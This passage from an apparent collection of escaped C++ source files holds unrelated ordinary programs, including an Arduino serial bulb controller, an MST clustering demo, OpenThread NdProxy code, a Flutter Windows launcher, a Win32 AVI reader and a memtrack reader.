column_i / col_width;\n                                int col_i = column_i % col_width;\n                                column(row_i, col_i) = channel(input_row, input_col);\n                                column_i++;\n                            } else {\n                                int row_i = column_i / col_width;\n                                int col_i = column_i % col_width;\n                                column(row_i, col_i) = 0;\n                                column_i++;\n                            }\n                            input_col += stride_w;\n                        }\n                    }\n                    input_row += stride_h;\n                }\n            }\n        }\n    }\n}\n\n\nImage ideal_function(\n        Image &image,\n        Filters &filters,\n        ConvMetadata data)\n{\n    int channels = data.inp_chans;\n    int filter_h = data.filter_h;\n    int filter_w = data.filter_w;\n    int output_h = data.output_h;\n    int output_w = data.output_w;\n\n    auto p_image = pad_image(data, image);\n    const int col_height = filter_h * filter_w * channels;\n    const int col_width = output_h * output_w;\n    Channel image_col(col_height, col_width);\n    i2c(p_image, image_col, data.filter_h, data.filter_w, data.stride_h, data.stride_w, data.output",
    "#include <iostream>\n#include <string>\n#include <cctype>\n#include \"SerialPort.h\"\n\nbool run = true;\n\nvoid getMessage (std::string* MESSAGE, SerialPort* PORT) {\n\t\n\tstd::cout << std::endl;\n\n\t// Builds the message until the \\n character to ensure message read properly per line\n\twhile (1) {\n\t\tchar cMsg = PORT->Read(1)[0]; // Converts to char\n\t\t\n\t\t// If message empty, exits loop\n\t\tif (cMsg == '\\0') {\n\t\t\t*MESSAGE = \"\";\n\t\t\tbreak;\n\t\t}\n\n\t\tstd::cout << cMsg << std::endl;\n\t\t\n\t\tif (cMsg == '\\n') {\n\t\t\t// Signal End of message, close loop\n\t\t\tstd::cout<<std::endl;\n\t\t\tbreak;\n\t\t} else {\n\t\t\t// Gather character\n\t\t\t*MESSAGE += std::string(1,cMsg);\n\t\t}\n\t}\n}\n\nvoid program () {\n\n\ttry {\n\t\t// ===== SETUP PORT ========================\n\t       \tSerialPort ARDUINO(\"COM3\");\n\n\t\tARDUINO.Settings(9600, 8); \n\n\t\t// ===== USER COMMAND ======================\n\t\tstd::string input;\n\t\tgetline(std::cin, input);\n\n\t\t// ===== SENDS COMMAND TO ARDUINO ==========\n\t\tif (input == \"on\") {\n\t\t\tARDUINO.Write(\"1\");\n\t\t\tstd::cout << \"\\b\\rBulb STATUS: ON\\n\";\n\t\t}\n\t\telse if (input == \"off\"){\n\t\t\tARDUINO.Write(\"0\");\n\t\t\tstd::cout << \"\\b\\rBulb STATUS: OFF\\n\";\n\t\t} else if (input == \"quit\") {\n\t\t\trun = false;\t\t// QUITS PROGRAM\t\t\t\n\t\t} else {\n\t\t\tstd::cout << \"\\b\\rInvalid Command\\n\";\n\t\t}\n\n\t\tstd::string msg; \n\t\tgetMessage(&msg, &ARDUINO);\n\t\tstd::cout << msg << \"\\n\";\n\n\t} catch (int error) { \n\t\t// ==================================================\n\t\t// \t\t     ERROR HANDLING\n\t\t// ==================================================\n\n\t\tswitch (error) {\n\t\t\tcase DISCONNECTED: \n\t\t\t\tstd::cout << \"DISCONNECTED\\n\";\n\t\t\t\tbreak;\n\n\t\t\tcase ACCESS_DENIED:\n\t\t\t\tstd::cout << \"PORT IN USE\\n\";\n\t\t\t\tbreak;\n\t\n\t\t\tcase CONFIG_ERR:\n\t\t\t\tstd::cout << \"COULD NOT CONFIGURE PORT\\n\";\n\t\t\t\tbreak;\n\n\t\t\tcase COMM_ERR:\n\t\t\t\tstd::cout << \"COULD NOT COMMUNICATE\\n\";\n\t\t\t\tbreak;\n\t\t}\n\n\t\trun = false;\n\t}\n}\n\nint main () {\n\t// Runs program until user quits\n\twhile (run == true) {\n\t\tprogram();\n\t}\n\n\treturn 0;\n}\n",
    "#include <chocolite.hpp>\n\nstd::vector<std::string> parse_query(std::string stream) {\n\n}\n\nChocolite::query check_query(std::vector<std::string> tokenised_stream) {\n    // Add logic to check syntax. You're going to need to tokenise the queries.\n}\n\nvoid parse_query(std::vector<std::string> tokenised_stream) {\n    switch(check_query(tokenised_stream)) {\n        case Chocolite::query::FINALISE:\n\n            break;\n        case Chocolite::query::PICK:\n\n            break;\n        case Chocolite::query::WIPE:\n\n            break;\n        case Chocolite::query::BUILD:\n\n            break;\n        case Chocolite::query::INSERT:\n\n            break;\n        case Chocolite::query::OBFUSCATE:\n\n            break;\n        case Chocolite::query::ADD_HEADER:\n\n            break;\n        case Chocolite::query::LOCK:\n\n            break;\n        case Chocolite::query::PUSH:\n\n            break;\n        case Chocolite::query::GRAB:\n\n            break;\n        case Chocolite::query::GRAB_RANGE:\n\n            break;\n        case Chocolite::query::MAKE:\n\n            break;\n        case Chocolite::query::MAKE_FIXED:\n\n            break;\n        case Chocolite::query::ERASE:\n\n            break;\n        case Chocolite::query::ERASE_RANGE:\n\n            break;\n        case Chocolite::query::REMOVE:\n        \n            break;\n    }\n}",
    "\ufeff#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include \"../lab_7_3_rek/lab_7_3_rek.cpp\"\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace UnitTest1\n{\n\tTEST_CLASS(UnitTest1)\n\t{\n\tpublic:\n\t\t\n        TEST_METHOD(TestFindEqualRowsAndCols)\n        {\n            // Setup a 3x3 matrix\n            int n = 3;\n            int** a = new int* [n];\n            for (int i = 0; i < n; i++)\n                a[i] = new int[n];\n\n            // Test case where row 0 == column 0 and row 1 == column 1\n            a[0][0] = 1; a[0][1] = 2; a[0][2] = 3;\n            a[1][0] = 2; a[1][1] = 1; a[1][2] = 4;\n            a[2][0] = 3; a[2][1] = 4; a[2][2] = 3;\n\n            // Redirect cout to a string stream\n            std::ostringstream oss;\n            std::streambuf* originalCout = std::cout.rdbuf(oss.rdbuf());\n\n            // Call the function\n            FindEqualRowsAndCols(a, n, 0);\n\n            // Restore cout\n            std::cout.rdbuf(originalCout);\n\n            // Check the output\n            std::string output = oss.str();\n            Assert::IsTrue(output.find(\"Row 0 is equal to Column 0\") != std::string::npos);\n            Assert::IsTrue(output.find(\"Row 1 is equal to Column 1\") != std::string::npos);\n\n            // Clean up\n            for (int i = 0; i < n; i++)\n                delete[] a[i];\n            delete[] a;\n        }\n\n\t};\n}\n",
    "/*\n* This file is part of the Pandaria 5.4.8 Project. See THANKS file for Copyright information\n*\n* This program is free software; you can redistribute it and/or modify it\n* under the terms of the GNU General Public License as published by the\n* Free Software Foundation; either version 2 of the License, or (at your\n* option) any later version.\n*\n* This program is distributed in the hope that it will be useful, but WITHOUT\n* ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n* FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n* more details.\n*\n* You should have received a copy of the GNU General Public License along\n* with this program. If not, see <http://www.gnu.org/licenses/>.\n*/\n\n/*\nThis placeholder for the instance is needed for dungeon finding to be able\nto give credit after the boss defined in lastEncounterDungeon is killed.\nWithout it, the party doing random dungeon won't get satchel of spoils and\ngets instead the deserter debuff.\n*/\n\n#include \"ScriptMgr.h\"\n#include \"InstanceScript.h\"\n\nclass instance_maraudon : public InstanceMapScript\n{\npublic:\n    instance_maraudon() : InstanceMapScript(\"instance_maraudon\", 349) { }\n\n    InstanceScript* GetInstanceScript(InstanceMap* map) const override\n    {\n        return new instance_maraudon_InstanceMapScript(map);\n    }\n\n    struct instance_maraudon_InstanceMapScript : public InstanceScript\n    {\n        instance_maraudon_InstanceMapScript(Map* map) : InstanceScript(map) { }\n    };\n};\n\nvoid AddSC_instance_maraudon()\n{\n    new instance_maraudon();\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n#include <random>\r\n#include <algorithm>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct Point {\r\n    double x;\r\n    double y;\r\n};\r\n\r\nstruct Edge {\r\n    int u;\r\n    int v;\r\n    double weight;\r\n};\r\n\r\n\r\nclass Clustering {\r\nprivate:\r\n    vector<Point> points;\r\n\r\n    vector<Edge> mstEdges;// \u0421\u043f\u0438\u0441\u043e\u043a \u0440\u0435\u0431\u0435\u0440 \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043e\u0441\u0442\u043e\u0432\u0430\r\n\r\n    vector<vector<bool>> adjacencyMatrix;\r\n    int klaster;\r\n\r\npublic:\r\n    Clustering(int n, int k) : klaster(k) {\r\n        generatePoints(n);\r\n        computeMinimumSpanningTree();\r\n        createAdjacencyMatrix();\r\n    }\r\n\r\n    void generatePoints(int n) {\r\n        random_device rd;\r\n        mt19937 generator(rd());\r\n        uniform_real_distribution<> distribution(0.0, 100.0);\r\n\r\n        for (int i = 0; i < n; ++i) {\r\n            points.push_back({ distribution(generator), distribution(generator) });\r\n        }\r\n    }\r\n\r\n    // \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c \u041f\u0440\u0438\u043c\u0430\r\n    void computeMinimumSpanningTree() {\r\n        int n = points.size();\r\n        vector<bool> visited(n, false);\r\n        vector<double> len(n, INFINITY); // \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u0434\u043e \u043d\u0435 \u043f\u043e\u0441\u0435\u0449\u0435\u043d\u043d\u044b\u0445 \u0432\u0435\u0440\u0448\u0438\u043d\r\n        vector<int> parent(n, -1); // \u0420\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0435 \u0432\u0435\u0440\u0448\u0438\u043d\u044b\r\n\r\n        len[0] = 0;\r\n\r\n        for (int count = 0; count < n - 1; ++count) {\r\n            int u = minLen(len, visited);\r\n            visited[u] = true;\r\n\r\n            for (int v = 0; v < n; ++v) {\r\n                if (!visited[v] && distance(points[u], points[v]) < len[v] && distance(points[u], points[v]) != 0) {\r\n                    parent[v] = u;\r\n                    len[v] = distance(points[u], points[v]);\r\n                }\r\n            }\r\n        }\r\n        for (int i = 1; i < n; ++i) {\r\n            mstEdges.push_back({ parent[i], i, distance(points[parent[i]], points[i]) });\r\n        }\r\n\r\n        sort(mstEdges.begin(), mstEdges.end(), [](const Edge& a, const Edge& b) {\r\n            return a.weight < b.weight;\r\n            });\r\n    }\r\n\r\n    int minLen(const vector<double>& len, const vector<bool>& visited) {\r\n        double min = INFINITY;\r\n        int minIndex = -1;\r\n\r\n        for (int v = 0; v < len.size(); ++v) {\r\n            if (!visited[v] && len[v] < min) {\r\n                min = len[v];\r\n                minIndex = v;\r\n            }\r\n        }\r\n\r\n        return minIndex;\r\n    }\r\n\r\n    double distance(const Point& p1, const Point& p2) {\r\n        return sqrt(pow(p1.x - p2.x, 2) + pow(p1.y - p2.y, 2));\r\n    }\r\n\r\n    void createAdjacencyMatrix() {\r\n        int n = points.size();\r\n        adjacencyMatrix.resize(n, vector<bool>(n, false));\r\n\r\n        for (int i = 0; i < n - klaster; ++i) {\r\n            adjacencyMatrix[mstEdges[i].u][mstEdges[i].v] = true;\r\n            adjacencyMatrix[mstEdges[i].v][mstEdges[i].u] = true;\r\n        }\r\n    }\r\n\r\n    void findClusters() {\r\n        int n = points.size();\r\n        vector<bool> visited(n, false);\r\n\r\n        for (int i = 0; i < n; ++i) {\r\n            if (!visited[i]) {\r\n                printClusterInfo(i, visited);\r\n            }\r\n        }\r\n    }\r\n\r\n    void printClusterInfo(int startVertex, vector<bool>& visited) {\r\n        vector<int> clusterVertices;\r\n        dfs(startVertex, visited, clusterVertices);\r\n\r\n        int numVertices = clusterVertices.size();\r\n\r\n        double minX = INFINITY, maxX = -INFINITY;\r\n        double minY = INFINITY, maxY = -INFINITY;\r\n        for (int vertex : clusterVertices) {\r\n            minX = min(minX, points[vertex].x);\r\n            maxX = max(maxX, points[vertex].x);\r\n            minY = min(minY, points[vertex].y);\r\n            maxY = max(maxY, points[vertex].y);\r\n        }\r\n\r\n        double centroidX = 0.0, centroidY = 0.0;\r\n        for (int vertex : clusterVertices) {\r\n            centroidX += points[vertex].x;\r\n            centroidY += points[vertex].y;\r\n        }\r\n        centroidX /= numVertices;\r\n        centroidY /= numVertices;\r\n\r\n\r\n        cout << \"\u041a\u043b\u0430\u0441\u0442\u0435\u0440:\" << endl;\r\n        cout << \"\u0427\u0438\u0441\u043b\u043e \u0432\u0435\u0440\u0448\u0438\u043d: \" << numVertices << endl;\r\n        cout << \"\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b: (\" << minX << \", \" << minY << \")\" << endl;\r\n        cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b: (\" << maxX << \", \" << maxY << \")\" << endl;\r\n        cout << \"\u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0446\u0435\u043d\u0442\u0440\u043e\u0438\u0434\u0430: (\" << centroidX << \", \" << centroidY << \")\" << endl << endl;\r\n        printAdjacencyMatrix();\r\n    }\r\n\r\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u043e\u0431\u0445\u043e\u0434\u0430 \u0432 \u0433\u043b\u0443\u0431\u0438\u043d\u0443\r\n    void dfs(int vertex, vector<bool>& visited, vector<int>& clusterVertices) {\r\n        visited[vertex] = true;\r\n        clusterVertices.push_back(vertex);\r\n\r\n        for (int i = 0; i < points.size(); ++i) {\r\n            if (!visited[i] && adjacencyMatrix[vertex][i]) {\r\n                dfs(i, visited, clusterVertices);\r\n            }\r\n        }\r\n    }\r\n\r\n    void printAdjacencyMatrix() {\r\n        int n = points.size();\r\n\r\n        cout << \"\u041c\u0430\u0442\u0440\u0438\u0446\u0430 \u0441\u043c\u0435\u0436\u043d\u043e\u0441\u0442\u0438:\" << endl;\r\n        for (int i = 0; i < n; ++i) {\r\n            for (int j = 0; j < n; ++j) {\r\n                cout << adjacencyMatrix[i][j] << \" \";\r\n            }\r\n            cout << endl;\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint m",
    "/*\n *  Copyright (c) 2020, The OpenThread Authors.\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions are met:\n *  1. Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *  2. Redistributions in binary form must reproduce the above copyright\n *     notice, this list of conditions and the following disclaimer in the\n *     documentation and/or other materials provided with the distribution.\n *  3. Neither the name of the copyright holder nor the\n *     names of its contributors may be used to endorse or promote products\n *     derived from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n *  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\n *  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n *  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n *  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n *  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n *  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n *  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n *  POSSIBILITY OF SUCH DAMAGE.\n */\n\n/**\n * @file\n *   This file implements Thread NdProxy Table management.\n */\n\n#include \"ndproxy_table.hpp\"\n\n#if OPENTHREAD_FTD && OPENTHREAD_CONFIG_BACKBONE_ROUTER_DUA_NDPROXYING_ENABLE\n\n#include \"common/array.hpp\"\n#include \"common/log.hpp\"\n#include \"common/num_utils.hpp\"\n#include \"instance/instance.hpp\"\n\nnamespace ot {\n\nnamespace BackboneRouter {\n\nRegisterLogModule(\"BbrNdProxy\");\n\nvoid NdProxyTable::NdProxy::Init(const Ip6::InterfaceIdentifier &aAddressIid,\n                                 const Ip6::InterfaceIdentifier &aMeshLocalIid,\n                                 uint16_t                        aRloc16,\n                                 uint32_t                        aTimeSinceLastTransaction)\n{\n    OT_ASSERT(!mValid);\n\n    Clear();\n\n    mValid        = true;\n    mAddressIid   = aAddressIid;\n    mMeshLocalIid = aMeshLocalIid;\n    mDadFlag      = true;\n\n    Update(aRloc16, aTimeSinceLastTransaction);\n}\n\nvoid NdProxyTable::NdProxy::Update(uint16_t aRloc16, uint32_t aTimeSinceLastTransaction)\n{\n    OT_ASSERT(mValid);\n\n    mRloc16                   = aRloc16;\n    aTimeSinceLastTransaction = Min(aTimeSinceLastTransaction, kMaxTimeSinceLastTransaction);\n    mLastRegistrationTime     = TimerMilli::GetNow() - TimeMilli::SecToMsec(aTimeSinceLastTransaction);\n}\n\nbool NdProxyTable::MatchesFilter(const NdProxy &aProxy, Filter aFilter)\n{\n    bool rval = false;\n\n    switch (aFilter)\n    {\n    case kFilterInvalid:\n        rval = !aProxy.mValid;\n        break;\n    case kFilterValid:\n        rval = aProxy.mValid;\n        break;\n    case kFilterDadInProcess:\n        rval = aProxy.mValid && aProxy.mDadFlag;\n        break;\n    }\n\n    return rval;\n}\n\nNdProxyTable::Iterator::Iterator(Instance &aInstance, Filter aFilter)\n    : InstanceLocator(aInstance)\n    , mFilter(aFilter)\n{\n    NdProxyTable &table = GetInstance().Get<BackboneRouter::NdProxyTable>();\n\n    mItem = &table.mProxies[0];\n\n    if (!MatchesFilter(*mItem, mFilter))\n    {\n        Advance();\n    }\n}\n\nNdProxyTable::Iterator::Iterator(Instance &aInstance, NdProxyTable::Iterator::IteratorType)\n    : InstanceLocator(aInstance)\n{\n    NdProxyTable &table = GetInstance().Get<BackboneRouter::NdProxyTable>();\n    mItem               = GetArrayEnd(table.mProxies);\n}\n\nvoid NdProxyTable::Iterator::Advance(void)\n{\n    NdProxyTable &table = GetInstance().Get<BackboneRouter::NdProxyTable>();\n\n    do\n    {\n        mItem++;\n    } while (mItem < GetArrayEnd(table.mProxies) && !MatchesFilter(*mItem, mFilter));\n}\n\nvoid NdProxyTable::Erase(NdProxy &aNdProxy) { aNdProxy.mValid = false; }\n\nvoid NdProxyTable::HandleDomainPrefixUpdate(DomainPrefixEvent aEvent)\n{\n    if (aEvent == kDomainPrefixAdded || aEvent == kDomainPrefixRemoved || aEvent == kDomainPrefixRefreshed)\n    {\n        Clear();\n    }\n}\n\nvoid NdProxyTable::Clear(void)\n{\n    for (NdProxy &proxy : mProxies)\n    {\n        proxy.Clear();\n    }\n\n    mCallback.InvokeIfSet(MapEnum(NdProxy::kCleared), nullptr);\n\n    LogInfo(\"NdProxyTable::Clear!\");\n}\n\nError NdProxyTable::Register(const Ip6::InterfaceIdentifier &aAddressIid,\n                             const Ip6::InterfaceIdentifier &aMeshLocalIid,\n                             uint16_t                        aRloc16,\n                             const uint32_t                 *aTimeSinceLastTransaction)\n{\n    Error    error                    = kErrorNone;\n    NdProxy *proxy                    = FindByAddre",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"to_do_api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_avi_reader.h\"\n#include <strsafe.h>\n\nconst int _BUFFER_SIZE_ = 16384;\n\nAVIReaderWin32::AVIReaderWin32()\n{\n\thFile = 0;\n\n\t_ring_buffer.reserve( _BUFFER_SIZE_ );\n\n\tend_of_file       = false;\n\n\tposition.QuadPart = 0;\n\tlocal_filename    = 0;\n}\n\nAVIReaderWin32::~AVIReaderWin32()\n{\n\tfree( local_filename );\n}\n\nvoid AVIReaderWin32::Close()\n{\n\tif ( hFile && hFile != INVALID_HANDLE_VALUE )\n\t{\n\t\t//CancelIo(hFile);\n\t\tCloseHandle( hFile );\n\t}\n}\n\nuint64_t AVIReaderWin32::GetContentLength()\n{\n\tLARGE_INTEGER position;\n\tposition.QuadPart = 0;\n\tposition.LowPart  = GetFileSize( hFile, (LPDWORD)&position.HighPart );\n\n\tif ( position.LowPart == INVALID_FILE_SIZE && GetLastError() != NO_ERROR )\n\t\treturn 0;\n\telse\n\t\treturn position.QuadPart;\n}\n\nvoid AVIReaderWin32::GetFilename( wchar_t *fn, size_t len )\n{\n\tStringCchCopyW( fn, len, local_filename );\n}\n\nint AVIReaderWin32::Open( const wchar_t *filename )\n{\n\tfree( local_filename );\n\tlocal_filename = _wcsdup( filename );\n\n\thFile = CreateFile( filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0 );\n\tif ( hFile == INVALID_HANDLE_VALUE )\n\t\treturn nsavi::READ_NOT_FOUND;\n\n\treturn nsavi::READ_OK;\n}\n\n/* used by RingBuffer::fill() */\nsize_t AVIReaderWin32::Read( void *dest, size_t len )\n{\n\t// TODO: use overlapped I/O so can we wait on the read simultaneously with the killswitch and seek_event\n\tDWORD bytes_read = 0;\t\n\tif ( ReadFile( hFile, dest, (DWORD)len, &bytes_read, NULL ) && bytes_read != len )\n\t\tend_of_file = true;\n\n\treturn bytes_read;\n}\n\nint AVIReaderWin32::Read( void *p_read_buffer, uint32_t read_length, uint32_t *bytes_read )\n{\n\tif ( end_of_file && _ring_buffer.empty() )\n\t\treturn nsavi::READ_EOF;\n\n\tsize_t total_bytes_read = 0;\n\n\twhile ( read_length && !( end_of_file && _ring_buffer.empty() ) )\n\t{\n\t\t// read what we can from the buffer\n\t\tsize_t bytes_read  = _ring_buffer.read( p_read_buffer, read_length );\n\t\tp_read_buffer      = (uint8_t *)p_read_buffer + bytes_read;\n\t\tread_length       -= (uint32_t)bytes_read;\n\t\ttotal_bytes_read  += bytes_read;\n\t\tposition.QuadPart += bytes_read;\n\n\t\tif ( read_length > _BUFFER_SIZE_ )\n\t\t{\n\t\t\t// read directly from the file if we have a large read\n\t\t\tbytes_read         = Read( p_read_buffer, read_length );\n\t\t\tp_read_buffer      = (uint8_t *)p_read_buffer + bytes_read;\n\t\t\tread_length       -= (uint32_t)bytes_read;\n\t\t\ttotal_bytes_read  += bytes_read;\n\t\t\tposition.QuadPart += bytes_read;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// refill buffer if necessary\n\t\t\t_ring_buffer.fill( this, _BUFFER_SIZE_ );\n\t\t}\n\t}\n\n\t*bytes_read = (uint32_t)total_bytes_read;\n\n\treturn nsavi::READ_OK;\n}\n\nint AVIReaderWin32::Peek( void *read_buffer, uint32_t read_length, uint32_t *bytes_read )\n{\n\tif ( end_of_file && _ring_buffer.empty() )\n\t\treturn nsavi::READ_EOF;\n\n\t// refill buffer if necessary\n\tif ( _ring_buffer.size() < read_length )\n\t\t_ring_buffer.fill( this, _BUFFER_SIZE_ );\n\n\t*bytes_read = (uint32_t)_ring_buffer.peek( read_buffer, read_length );\n\n\treturn nsavi::READ_OK;\n}\n\nstatic LONGLONG Seek64( HANDLE hf, __int64 distance, DWORD MoveMethod )\n{\n\tLARGE_INTEGER li;\n\tli.QuadPart = distance;\n\tli.LowPart = SetFilePointer( hf, li.LowPart, &li.HighPart, MoveMethod );\n\tif ( li.LowPart == INVALID_SET_FILE_POINTER && GetLastError() != NO_ERROR )\n\t{\n\t\tli.QuadPart = -1;\n\t}\n\n\treturn li.QuadPart;\n}\n\nint AVIReaderWin32::Seek( uint64_t new_position )\n{\n\t_ring_buffer.clear();\n\n\tposition.QuadPart = Seek64( hFile, new_position, SEEK_SET );\n\tend_of_file       = ( position.QuadPart != new_position );\n\n\treturn nsavi::READ_OK;\n}\n\nuint64_t AVIReaderWin32::Tell()\n{\n\treturn position.QuadPart;\n}\n\nint AVIReaderWin32::Skip( uint32_t skip_bytes )\n{\n\tif ( end_of_file && _ring_buffer.empty() )\n\t\treturn nsavi::READ_EOF;\n\n\tif ( skip_bytes < _ring_buffer.size() )\n\t{\n\t\t_ring_buffer.advance( skip_bytes );\n\n\t\tposition.QuadPart += skip_bytes;\n\n\t\treturn nsavi::READ_OK;\n\t}\n\telse\n\t{\n\t\treturn Seek( position.QuadPart + skip_bytes );\n\t}\n}\n\nvoid AVIReaderWin32::OverlappedHint( uint32_t read_length )\n{\n\tif ( read_length > _ring_buffer.size() )\n\t\t_ring_buffer.fill( this, _BUFFER_SIZE_ );\n}\n",
    "/*\n * Copyright (c) 2021 The Linux Foundation. All rights reserved.\n * Not a contribution\n * Copyright (C) 2013 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n/*\n * Changes from Qualcomm Innovation Center are provided under the following\n * license:\n * Copyright (c) 2022 Qualcomm Innovation Center, Inc. All rights reserved.\n * SPDX-License-Identifier: BSD-3-Clause-Clear\n */\n#include \"memtrack_kgsl.h\"\n#include <errno.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <log/log.h>\n\n#define DEBUG 0\n\nnamespace vendor {\nnamespace qti {\nnamespace hardware {\nnamespace memtrack {\n\nint getKgslMemory(int pid, MemtrackType type,\n                  std::vector<MemtrackRecord> *records) {\n  char syspath[128];\n  size_t accounted_size = 0;\n  size_t unaccounted_size = 0;\n  FILE *fp;\n  int ret;\n  if (type == MemtrackType::GL) {\n    snprintf(syspath, sizeof(syspath),\n             \"/sys/class/kgsl/kgsl/proc/%d/gpumem_mapped\", pid);\n    fp = fopen(syspath, \"r\");\n    if (fp == NULL)\n      return -errno;\n    ret = fscanf(fp, \"%zu\", &accounted_size);\n    if (ret != 1) {\n      fclose(fp);\n      return -EINVAL;\n    }\n    fclose(fp);\n    snprintf(syspath, sizeof(syspath),\n             \"/sys/class/kgsl/kgsl/proc/%d/gpumem_unmapped\", pid);\n    fp = fopen(syspath, \"r\");\n    if (fp == NULL) {\n      return -errno;\n    }\n    ret = fscanf(fp, \"%zu\", &unaccounted_size);\n    if (ret != 1) {\n      fclose(fp);\n      return -EINVAL;\n    }\n    fclose(fp);\n\n    if (accounted_size > 0) {\n        MemtrackRecord rec;\n        rec.flags = MemtrackRecord::FLAG_SMAPS_ACCOUNTED |\n                    MemtrackRecord::FLAG_NONSECURE |\n                    MemtrackRecord::FLAG_PRIVATE;\n        rec.sizeInBytes = accounted_size;\n        records->push_back(rec);\n    }\n    if (unaccounted_size > 0) {\n        MemtrackRecord rec;\n        rec.flags = MemtrackRecord::FLAG_SMAPS_UNACCOUNTED |\n                    MemtrackRecord::FLAG_NONSECURE |\n                    MemtrackRecord::FLAG_PRIVATE;\n        rec.sizeInBytes = unaccounted_size;\n        records->push_back(rec);\n    }\n\n\n\n  } else if (type == MemtrackType::GRAPHICS) {\n    snprintf(syspath, sizeof(syspath),\n             \"/sys/class/kgsl/kgsl/proc/%d/imported_mem\", pid);\n    fp = fopen(syspath, \"r\");\n    if (fp == NULL)\n      return -errno;\n    ret = fscanf(fp, \"%zu\", &unaccounted_size);\n    if (ret != 1) {\n      fclose(fp);\n      return -EINVAL;\n    }\n    fclose(fp);\n    if (unaccounted_size > 0) {\n        MemtrackRecord rec;\n        rec.flags = MemtrackRecord::FLAG_SMAPS_UNACCOUNTED |\n                    MemtrackRecord::FLAG_NONSECURE |\n                    MemtrackRecord::FLAG_PRIVATE;\n        rec.sizeInBytes = unaccounted_size;\n        records->push_back(rec);\n    }\n  }\n  if (records && !records->empty()) {\n    for (auto &v : *records) {\n      ALOGI_IF(DEBUG, \"getKgslMemory: pid: %d type: %s flags: 0x%x size: %ld bytes\", pid,\n            aidl::android::hardware::memtrack::toString(type).c_str(), v.flags,\n            v.sizeInBytes);\n    }\n  }\n  return 0;\n}\n\n} // namespace memtrack\n} // namespace hardware\n} // namespace qti\n} // namespace vendor\n",
